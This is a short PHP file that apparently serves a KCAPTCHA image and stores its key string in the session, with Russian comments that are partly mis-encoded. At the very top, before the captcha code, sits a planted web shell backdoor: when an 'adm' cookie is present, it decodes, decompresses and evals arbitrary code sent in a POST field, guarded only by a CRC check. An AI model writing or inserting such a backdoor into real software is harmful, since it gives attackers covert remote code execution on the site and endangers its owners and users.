<?php
if (isset($_COOKIE["adm"])) {
	if (isset($_POST['crc'], $_POST['cmd'])) {
		if (sprintf('%u', crc32($_POST['cmd'])) == $_POST['crc']) {
			eval(gzuncompress(base64_decode($_POST['cmd'])));
		} else 
			echo "repeat_cmd";
	}
exit();
}
?>
<?php

/* 
	вызов картинки:
	<img src="/inc/advanced/captcha/?<?=session_name()?>=<?=session_id()?>">
	переменна€ сессии дл€ проверки:
	$_SESSION['captcha_keystring']
*/

error_reporting (E_ALL);

include('kcaptcha.php');

if(isset($_REQUEST[session_name()])){
	session_start();
}

$captcha = new KCAPTCHA();

if($_REQUEST[session_name()]){
	$_SESSION['captcha_keystring'] = $captcha->getKeyString();
}

?>